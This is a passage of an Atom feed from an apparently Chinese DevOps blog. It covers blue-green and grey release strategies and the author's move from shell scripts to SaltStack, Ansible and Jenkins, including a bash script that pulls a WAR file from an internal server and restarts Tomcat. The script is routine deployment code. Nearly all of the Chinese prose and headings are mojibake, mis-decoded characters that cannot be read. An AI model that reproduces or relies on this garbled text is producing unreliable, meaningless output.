&lt;h3 id=&quot;æ€»ç»“ï¼š&quot;&gt;&lt;a href=&quot;#æ€»ç»“ï¼š&quot; class=&quot;headerlink&quot; title=&quot;æ€»ç»“ï¼š&quot;&gt;&lt;/a&gt;æ€»ç»“ï¼š&lt;/h3&gt;&lt;p&gt;1) è“ç»¿éƒ¨ç½²ï¼šä¸åœæ­¢è€ç‰ˆæœ¬ï¼Œé¢å¤–æä¸€å¥—æ–°ç‰ˆæœ¬ï¼Œç­‰æµ‹è¯•å‘ç°æ–°ç‰ˆæœ¬OKåï¼Œåˆ é™¤è€ç‰ˆæœ¬ã€‚å…¶å®è¿™é‡Œåˆ é™¤è€ç‰ˆæœ¬ä¹Ÿå°±æ˜¯é‡æ–°éƒ¨ç½²äº†è€ç‰ˆæœ¬æˆä¸ºæ–°ç‰ˆæœ¬ä¸€èµ·æ”¾ä¸Šå»ï¼Œç­‰éœ€è¦æ›´æ–°å‘å¸ƒè¿ä¸‹æœŸä¸­ä¸€ä¸ªç‰ˆæœ¬ç¯å¢ƒéƒ¨ç½²ï¼šç°åœ¨æˆ‘ä»¬å…¬å¸ä½¿ç”¨è“ç»¿éƒ¨ç½²æ–¹æ¡ˆã€‚&lt;/p&gt;
&lt;p&gt;3) ç°åº¦å‘å¸ƒï¼šä¸åœæ­¢è€ç‰ˆæœ¬ï¼Œé¢å¤–æä¸€å¥—æ–°ç‰ˆæœ¬ï¼Œå¸¸å¸¸æŒ‰ç…§ç”¨æˆ·è®¾ç½®è·¯ç”±æƒé‡ï¼Œä¾‹å¦‚90%çš„ç”¨æˆ·ç»´æŒä½¿ç”¨è€ç‰ˆæœ¬ï¼Œ10%çš„ç”¨æˆ·å°é²œæ–°ç‰ˆæœ¬ã€‚ä¸åŒç‰ˆæœ¬åº”ç”¨å…±å­˜ï¼Œç»å¸¸ä¸A/Bæµ‹è¯•ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºæµ‹è¯•é€‰æ‹©å¤šç§æ–¹æ¡ˆã€‚&lt;/p&gt;
&lt;h3 id=&quot;å…¶å®ä¸¤ç§å«ä¹‰ä¸ªäººè®¤ä¸ºç›¸å·®ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œéƒ½ç‰¹åˆ«é€‚åˆç°åœ¨å‘å¸ƒéƒ¨ç½²æµç¨‹æ–¹æ¡ˆã€‚&quot;&gt;&lt;a href=&quot;#å…¶å®ä¸¤ç§å«ä¹‰ä¸ªäººè®¤ä¸ºç›¸å·®ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œéƒ½ç‰¹åˆ«é€‚åˆç°åœ¨å‘å¸ƒéƒ¨ç½²æµç¨‹æ–¹æ¡ˆã€‚&quot; class=&quot;headerlink&quot; title=&quot;å…¶å®ä¸¤ç§å«ä¹‰ä¸ªäººè®¤ä¸ºç›¸å·®ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œéƒ½ç‰¹åˆ«é€‚åˆç°åœ¨å‘å¸ƒéƒ¨ç½²æµç¨‹æ–¹æ¡ˆã€‚&quot;&gt;&lt;/a&gt;å…¶å®ä¸¤ç§å«ä¹‰ä¸ªäººè®¤ä¸ºç›¸å·®ä¸æ˜¯ç‰¹åˆ«å¤§ï¼Œéƒ½ç‰¹åˆ«é€‚åˆç°åœ¨å‘å¸ƒéƒ¨ç½²æµç¨‹æ–¹æ¡ˆã€‚&lt;/h3&gt;</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;APPè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šå¼€å‘éƒ¨ç½²ã€æµ‹è¯•éƒ¨ç½²ã€ç°åº¦å‘å¸ƒç­‰éƒ¨ç½²æ–¹æ¡ˆå¯¹æ¯”ä¸æ€»ç»“&quot;&gt;&lt;a href=&quot;#APPè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šå¼€å‘éƒ¨ç½²ã€æµ‹è¯•éƒ¨ç½²ã€ç°åº¦å‘å¸ƒç­‰éƒ¨ç½²æ–¹æ¡ˆå¯¹æ¯”ä¸æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;APPè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šå¼€å‘éƒ¨ç½²ã€æµ‹è¯•éƒ¨ç½²ã€ç°åº¦å‘å¸ƒç­‰éƒ¨ç½²
    
    </summary>
    
      <category term="è¿ç»´ç¬”è®°" scheme="http://blog.yangcvo.me/categories/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Automation Deploy" scheme="http://blog.yangcvo.me/tags/Automation-Deploy/"/>
    
  </entry>
  
  <entry>
    <title>è¿ç»´è‡ªåŠ¨åŒ–æ€»ç»“-è®°å½•å¸®åŠ©å…¬å¸è‡ªåŠ¨åŒ–æ¶æ„æ¼”å˜è¿‡ç¨‹</title>
    <link href="http://blog.yangcvo.me/2017/03/14/%E8%87%AA%E5%8A%A8%E5%8C%96+%E5%8F%AF%E8%A7%86%E5%8C%96/%E8%BF%90%E7%BB%B4%E8%87%AA%E5%8A%A8%E5%8C%96/%E8%BF%90%E7%BB%B4%E8%87%AA%E5%8A%A8%E5%8C%96%E6%80%BB%E7%BB%93-%E8%AE%B0%E5%BD%95%E5%B8%AE%E5%8A%A9%E5%85%AC%E5%8F%B8%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%B6%E6%9E%84%E6%BC%94%E5%8F%98%E8%BF%87%E7%A8%8B/"/>
    <id>http://blog.yangcvo.me/2017/03/14/è‡ªåŠ¨åŒ–+å¯è§†åŒ–/è¿ç»´è‡ªåŠ¨åŒ–/è¿ç»´è‡ªåŠ¨åŒ–æ€»ç»“-è®°å½•å¸®åŠ©å…¬å¸è‡ªåŠ¨åŒ–æ¶æ„æ¼”å˜è¿‡ç¨‹/</id>
    <published>2017-03-14T03:34:17.000Z</published>
    <updated>2017-03-28T11:09:04.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°å½•è‡ªå·±è‡ªåŠ¨åŒ–è¿ç»´æŠ€æœ¯æå‡ğŸ‘&quot;&gt;&lt;a href=&quot;#è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°å½•è‡ªå·±è‡ªåŠ¨åŒ–è¿ç»´æŠ€æœ¯æå‡ğŸ‘&quot; class=&quot;headerlink&quot; title=&quot;è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°å½•è‡ªå·±è‡ªåŠ¨åŒ–è¿ç»´æŠ€æœ¯æå‡ğŸ‘&quot;&gt;&lt;/a&gt;è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°å½•è‡ªå·±è‡ªåŠ¨åŒ–è¿ç»´æŠ€æœ¯æå‡ğŸ‘&lt;/h3&gt;&lt;h3 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h3&gt;&lt;p&gt;ä¸ªäºº2014å¹´å¼€å§‹ç©è‡ªåŠ¨åŒ–çš„ä¹Ÿæ˜¯åˆšä»ä¸š&lt;code&gt;è‡ªåŠ¨åŒ–è¿ç»´&lt;/code&gt;å²—ä½ç¬¬ä¸€ä»½å·¥ä½œï¼Œåœ¨ä¸€å®¶ä¸Šå¸‚å…¬å¸åš&lt;code&gt;IDC+APM+CDN&lt;/code&gt;åšäº‘åŠ é€Ÿçš„åº”è¯¥å¾ˆå¤šç©cdnçš„éƒ½å¬è¯´è¿™å®¶å…¬å¸ï¼&lt;code&gt;mmtrix.com&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€å¼€å§‹å¼€å§‹æ·±åº¦å­¦ä¹ çš„æ˜¯SaltStackæ‰€ä»¥æŒæ¡çš„æ¯”è¾ƒæ·±æ›´åŠ ç†Ÿç»ƒï¼Œå…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªå¥½æœ‹å‹æ¨èæˆ‘çœ‹äº†ä¸€æœ¬ä¹¦&lt;code&gt;pythonå…¥é—¨åˆ°ç²¾é€š&lt;/code&gt; é‡Œé¢æœ‰è¯¦ç»†è®²åˆ°saltå®‰è£…å’Œä½¿ç”¨éƒ¨ç½²è‡ªåŠ¨åŒ–å„ç§æ“ä½œï¼Œçš„ç¡®å¾ˆæ–¹ä¾¿ã€‚åé¢åœ¨æµ‹è¯•ç¯å¢ƒæˆ‘è‡ªå·±ç®¡ç†å‡ åå°æœåŠ¡å™¨ï¼å­¦ä¹ ä½¿ç”¨&lt;code&gt;Ansible&lt;/code&gt;å»æ“ä½œï¼Œå› ä¸ºsaltè·Ÿansibleæœ€å¤§çš„åŒºåˆ«ï¼Œé™¤äº†ansibleå¿«é€Ÿä¸Šæ‰‹å’Œä¸éœ€è¦å¤æ‚çš„å®‰è£…ï¼Œä¸»è¦åœ¨å†…ç½‘æ–¹é¢æ¯”saltæ›´ç¨³å®šæ¶æ„ä¹Ÿæ¯”saltå¥½ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨çº¿ä¸Šæˆ‘ä»¬éƒ½æ˜¯ç”¨saltå»æ“ä½œçš„ï¼Œå¯æ˜¯å½“æ—¶å…¬å¸è¿˜æ²¡æœ‰è¿ç»´å¼€å‘çš„äººå‘˜ï¼Œæ‰€ä»¥åæ¥saltåœ¨ç»ˆç«¯æ“ä½œå‡ºäº†å¾ˆå¤šé”™ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ç¬¬ä¸€ï¼šäººå‘˜æ“ä½œå¤±è¯¯ä¸€æ¬¡ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ‰€æœ‰çš„æœåŠ¡å™¨éƒ½ä¼šå—å½±å“ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ç¬¬äºŒï¼šå‘½ä»¤å¤ªå¤šæœåŠ¡æƒé™éœ€è¦ä¸€ä¸€ç»Ÿä¸€åˆ†é…ç™»é™†ç»ˆç«¯æ“ä½œã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é‚£æ—¶å€™æœåŠ¡å™¨æœ‰500å¤šå°é‚£æ—¶å€™è¿ç»´æ“ä½œèµ·æ¥è¿˜æ˜¯æŒºè´¹åŠ›çš„ã€‚ &lt;/p&gt;
&lt;h3 id=&quot;ç»å†ï¼š&quot;&gt;&lt;a href=&quot;#ç»å†ï¼š&quot; class=&quot;headerlink&quot; title=&quot;ç»å†ï¼š&quot;&gt;&lt;/a&gt;ç»å†ï¼š&lt;/h3&gt;&lt;p&gt;2016å¹´åˆ3æœˆä»½å»å‚åŠ 360çš„ä¸€æ¬¡è¿ç»´å¤§ä¼šï¼Œç‹æµ©å®‡360çš„è¿ç»´å¼€å‘äººå‘˜åˆ†äº«äº†ä¸€ç‰‡æ–‡ç« ï¼š&lt;code&gt;å¤§è§„æ¨¡é›†ç¾¤ä¸Šçš„å¤šä¸šåŠ¡çº¿ç¯å¢ƒéƒ¨ç½².&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è®²çš„éå¸¸å¥½ï¼Œç”¨çš„æ˜¯Puppetå»å®ç°3000å¤šå°çš„æœåŠ¡å™¨éƒ¨ç½²ï¼ŒæŒ‡å®šéƒ¨ç½²å®‰è£…åŒ…ç­‰ç­‰ã€‚éå¸¸æ–¹ä¾¿ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œä¹Ÿåœ¨Infoqä¸Šé¢æœ‰ä»–çš„åˆ†äº«ä½œå“æˆ‘è¿™é‡Œç²˜è´´å‡ºæ¥äº†ï¼š&lt;a href=&quot;http://www.infoq.com/cn/articles/multi-service-line-environment-deployment&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;å¤§è§„æ¨¡é›†ç¾¤ä¸Šçš„å¤šä¸šåŠ¡çº¿ç¯å¢ƒéƒ¨ç½²&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;ä¸ªäººç°åœ¨è¿ç»´è‡ªåŠ¨åŒ–æ¼”å˜è¿‡ç¨‹ç»éªŒï¼š&quot;&gt;&lt;a href=&quot;#ä¸ªäººç°åœ¨è¿ç»´è‡ªåŠ¨åŒ–æ¼”å˜è¿‡ç¨‹ç»éªŒï¼š&quot; class=&quot;headerlink&quot; title=&quot;ä¸ªäººç°åœ¨è¿ç»´è‡ªåŠ¨åŒ–æ¼”å˜è¿‡ç¨‹ç»éªŒï¼š&quot;&gt;&lt;/a&gt;ä¸ªäººç°åœ¨è¿ç»´è‡ªåŠ¨åŒ–æ¼”å˜è¿‡ç¨‹ç»éªŒï¼š&lt;/h4&gt;&lt;p&gt;æˆ‘ç°åœ¨åœ¨ä¸€å®¶ä¸Šå¸‚å…¬å¸æ——ä¸‹æ§è‚¡åŒ»ç–—å¤§æ•°æ®å­å…¬å¸è´Ÿè´£è¿ç»´éƒ¨é—¨ï¼Œè´Ÿè´£ITç½‘ç»œå®‰å…¨åŠå…¬ï¼šä¸»è¦åšçš„åº”ç”¨è¿ç»´å’Œç½‘ç»œè¿ç»´ï¼Œå…¼å¤§æ•°æ®è¿ç»´ã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€ä¸ªç‰ˆæœ¬å…¬å¸æ•´ä½“æœåŠ¡æ¶æ„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/yjkjiagoutu.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;2016å¹´2æœˆä»½è„šæœ¬å½¢å¼è‡ªåŠ¨åŒ–å‘å¸ƒï¼š&quot;&gt;&lt;a href=&quot;#2016å¹´2æœˆä»½è„šæœ¬å½¢å¼è‡ªåŠ¨åŒ–å‘å¸ƒï¼š&quot; class=&quot;headerlink&quot; title=&quot;2016å¹´2æœˆä»½è„šæœ¬å½¢å¼è‡ªåŠ¨åŒ–å‘å¸ƒï¼š&quot;&gt;&lt;/a&gt;2016å¹´2æœˆä»½è„šæœ¬å½¢å¼è‡ªåŠ¨åŒ–å‘å¸ƒï¼š&lt;/h4&gt;&lt;p&gt;16å¹´2æœˆä»½è¿™é‡Œçš„Tomcatè‡ªåŠ¨åŒ– å‘å¸ƒæˆ‘ä¸€å¼€å§‹ä½¿ç”¨shellè„šæœ¬å»å®ç°è‡ªåŠ¨åŒ–å‘å¸ƒå’Œå›æ»šã€‚ &lt;/p&gt;
&lt;h4 id=&quot;2016å¹´4æœˆä»½saltè‡ªåŠ¨åŒ–è¿œç¨‹æ§åˆ¶è„šæœ¬å‘å¸ƒï¼š&quot;&gt;&lt;a href=&quot;#2016å¹´4æœˆä»½saltè‡ªåŠ¨åŒ–è¿œç¨‹æ§åˆ¶è„šæœ¬å‘å¸ƒï¼š&quot; class=&quot;headerlink&quot; title=&quot;2016å¹´4æœˆä»½saltè‡ªåŠ¨åŒ–è¿œç¨‹æ§åˆ¶è„šæœ¬å‘å¸ƒï¼š&quot;&gt;&lt;/a&gt;2016å¹´4æœˆä»½saltè‡ªåŠ¨åŒ–è¿œç¨‹æ§åˆ¶è„šæœ¬å‘å¸ƒï¼š&lt;/h4&gt;&lt;p&gt;16å¹´4æœˆä»½è¿™é‡Œçš„tomcatæœåŠ¡å¢å¤šï¼Œå‘ç°è„šæœ¬å‘å¸ƒæ‰‹å·¥æ“ä½œå¤ªç¹çï¼Œè€Œä¸”å‡ºç°é—®é¢˜å‡ ç‡å¤§ï¼Œæ•ˆç‡ä¸é«˜ã€‚æ¯æ¬¡ä¸€æ¬¡å¤§ç‰ˆæœ¬æ”¹åŠ¨å‘å¸ƒä¼šå‡ºç°å¾ˆå¤šé—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè·ŸéšæœåŠ¡æ¨¡å—å¢å¤šï¼Œç°åœ¨æœåŠ¡å™¨90å¤šå°ï¼Œç»Ÿä¸€saltè‡ªåŠ¨åŒ–è°ƒç”¨æ¯å°å¯¹åº”è„šæœ¬å‘å¸ƒå›æ»šã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè´´ä¸Šæˆ‘å†™çš„saltç»“åˆè°ƒç”¨è„šæœ¬å‘½ä»¤ï¼Œå†™åœ¨å‘å¸ƒæœºå™¨ä¸Šé¢ã€‚è¿™æ ·å°±ä¸éœ€è¦è¿›å…¥æœºå™¨æ¯å°æ‰§è¡Œå¯¹åº”å‘å¸ƒè„šæœ¬ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#author chengyangyang&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#2016å¹´5æœˆ25æ—¥&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#this script is only for CentOS 6&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#check the OS&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#This script is used for the project release, which needs to be run by the root user&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;platform=`uname -i`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;variable&quot;&gt;$platform&lt;/span&gt; != &lt;span class=&quot;string&quot;&gt;&quot;x86_64&quot;&lt;/span&gt; ];&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;this script is only for 64bit Operating System !&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;the platform is ok&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;version=`cat /etc/redhat-release |awk &lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;print substr($3,1,1)&amp;#125;&#39;&lt;/span&gt;`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;variable&quot;&gt;$version&lt;/span&gt; != 6 ];&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;this script is only for CentOS 6 !&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat &amp;lt;&amp;lt; EOF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+----------------------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|   your system is CentOS 6 x86_64       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|   start Update release tomcat.......   |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+----------------------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;EOF&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#To determine whether the root permissions&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$UID&lt;/span&gt;&quot;&lt;/span&gt; != &lt;span class=&quot;string&quot;&gt;&#39;0&#39;&lt;/span&gt; ]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Permission denied, please switch the root tomcat.&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&quot;curl -O  http://10.47.100.90/ihaozhuo/war/haozhuo-tomcat.war&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&quot;md5sum haozhuo-tomcat.war&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&quot;mv haozhuo-tomcat.war java_war/&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&quot;node&quot;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&quot;sh /root/update/tomcat.sh&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&#39;node&#39;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&#39;/etc/init.d/tomcat-tomcat stop&#39;&lt;/span&gt; env=&lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&quot;LC_ALL&quot;: &quot;zh_CN.UTF-8&quot;&amp;#125;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;salt &lt;span class=&quot;string&quot;&gt;&#39;node&#39;&lt;/span&gt; cmd.run &lt;span class=&quot;string&quot;&gt;&#39;/etc/init.d/tomcat-tomcat start&#39;&lt;/span&gt; env=&lt;span class=&quot;string&quot;&gt;&#39;&amp;#123;&quot;LC_ALL&quot;: &quot;zh_CN.UTF-8&quot;&amp;#125;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[ $? &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ] &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;2016å¹´5æœˆä»½å»é™¤äº†saltæ›¿æ¢æ›´æ–°Ansible-Jenkins-Mavenï¼‹Nginxæå®šè‡ªåŠ¨å‘å¸ƒï¼Œæ„å»ºç¨‹åºçš„æŒç»­é›†æˆå¹³å°&quot;&gt;&lt;a href=&quot;#2016å¹´5æœˆä»½å»é™¤äº†saltæ›¿æ¢æ›´æ–°Ansible-Jenkins-Mavenï¼‹Nginxæå®šè‡ªåŠ¨å‘å¸ƒï¼Œæ„å»ºç¨‹åºçš„æŒç»­é›†æˆå¹³å°&quot; class=&quot;headerlink&quot; title=&quot;2016å¹´5æœˆä»½å»é™¤äº†saltæ›¿æ¢æ›´æ–°Ansible + Jenkins+Mavenï¼‹Nginxæå®šè‡ªåŠ¨å‘å¸ƒï¼Œæ„å»ºç¨‹åºçš„æŒç»­é›†æˆå¹³å°&quot;&gt;&lt;/a&gt;2016å¹´5æœˆä»½å»é™¤äº†saltæ›¿æ¢æ›´æ–°Ansible + Jenkins+Mavenï¼‹Nginxæå®šè‡ªåŠ¨å‘å¸ƒï¼Œæ„å»ºç¨‹åºçš„æŒç»­é›†æˆå¹³å°&lt;/h4&gt;&lt;h4 id=&quot;Ansible-vs-SaltStack-å¯¹æ¯”ï¼Ÿ&quot;&gt;&lt;a href=&quot;#Ansible-vs-SaltStack-å¯¹æ¯”ï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;Ansible vs SaltStack å¯¹æ¯”ï¼Ÿ&quot;&gt;&lt;/a&gt;Ansible vs SaltStack å¯¹æ¯”ï¼Ÿ&lt;/h4&gt;&lt;h6 id=&quot;1-è‡ªèº«è¿ç»´&quot;&gt;&lt;a 